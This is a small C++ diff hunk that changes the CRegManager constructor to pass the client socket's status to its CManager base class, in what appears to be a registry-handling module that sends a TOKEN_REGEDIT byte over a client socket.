@@ -9,7 +9,7 @@
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-CRegManager::CRegManager(CClientSocket *pClient) : CManager(pClient)
+CRegManager::CRegManager(CClientSocket *pClient) : CManager(pClient, pClient->GetStatus())
 {
     BYTE bToken = TOKEN_REGEDIT;
     pClient->Send(&bToken,1);
